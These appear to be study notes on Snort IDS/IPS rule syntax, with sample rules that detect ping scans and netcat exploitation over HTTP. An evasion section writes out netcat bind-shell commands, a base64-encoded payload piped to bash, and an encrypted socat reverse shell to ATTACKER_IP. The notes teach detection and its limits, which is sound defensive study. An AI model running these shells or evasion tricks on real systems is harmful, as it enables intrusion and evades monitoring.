
## IDS / IPS Rule Structure (Snort)

Snort rules follow the format:

`Action Protocol SourceIP SourcePort Direction DestIP DestPort (Options)`

### Rule Header Components

- **Action:** `alert`, `log`, `pass`, `drop`, `reject`
    
- **Protocol:** `TCP`, `UDP`, `ICMP`, `IP`
    
- **Source IP / Port:** Can include negation (`!10.10.0.0/16`)
    
- **Direction:**
    
    - `->` one-way
        
    - `<>` bidirectional
        
- **Destination IP / Port:** Target network/service
    

---

## Example 1: Dropping ICMP Traffic (IPS Mode)

`drop icmp any any -> any any (msg:"ICMP Ping Scan"; dsize:0; sid:1000020; rev:1;)`

### What it Does

- Drops **all ICMP packets**
    
- Logs message: _ICMP Ping Scan_
    
- Blocks ping sweeps and ICMP-based reconnaissance
    

---

## Detecting Application Exploitation (HTTP POST)

### Scenario

- Web server vulnerable via **HTTP POST**
    
- Attacker uses **netcat (ncat)** to exploit it
    

---

## Example 2: Naive Signature Rule (ASCII)

`alert tcp any any <> any 80 (msg:"Netcat Exploitation"; content:"ncat"; sid:1000030; rev:1;)`

### Limitation

- Matches literal string `ncat`
    
- Easily bypassed by encoding or modification
    

---

## Example 3: Hexadecimal Content Matching

`alert tcp any any <> any 80 (msg:"Netcat Exploitation"; content:"|6e 63 61 74|"; sid:1000031; rev:1;)`

### Notes

- `ncat` in hex = `6e 63 61 74`
    
- Hex encoding avoids ASCII logging issues
    

---

## Example 4: Refined HTTP POST Detection

`alert tcp any any <> any 80 (   msg:"Netcat Exploitation";   flow:established,to_server;   content:"POST"; nocase; http_method;   content:"ncat"; nocase;   sid:1000032; rev:1; )`

### Improvements

- Inspects only:
    
    - Established TCP sessions
        
    - Traffic going **to the server**
        
    - HTTP POST requests
        
- Reduces false positives
    

---

## Sample Snort Alert Output (ASCII Logging)

`[**] [1:1000031:1] Netcat Exploitation [**] 01/14-12:51:26.717401 10.14.17.226:45480 -> 10.10.112.168:80`

---

## Evasion: Payload Modification Commands

### 1. Simple Command Modification

`ncat -lvnp 4444 -e /bin/bash`

Evasion examples:

`nc -lvp 4444 -e /bin/bash ncat -l -p 4444 -e /bin/bash`

---

### 2. Base64 Encoding

Encode payload:

`echo "ncat -lvnp 4444 -e /bin/bash" | base64`

Decode and execute on target:

`echo bmNhdCAtbHZucCA0NDQ0IC1lIC9iaW4vYmFzaA== | base64 -d | bash`

---

### 3. URL Encoding (Web Exploits)

Example:

`ncat%20-lvnp%204444%20-e%20/bin/bash`

---

### 4. Encrypted Reverse Shell (IDS Blind Spot)

#### Generate Certificate

`openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem cat key.pem cert.pem > pem.pem`

#### Listener (Attacker)

`socat OPENSSL-LISTEN:4444,cert=pem.pem,verify=0 -`

#### Target Reverse Shell

`socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash`

---

## Key Takeaways

- Signature-based IDS relies on **exact pattern matching**
    
- Minor payload changes easily evade detection
    
- Encoding ≠ encryption
    
- Encrypted traffic **bypasses payload inspection**
    
- Detection effectiveness depends on **signature quality and updates**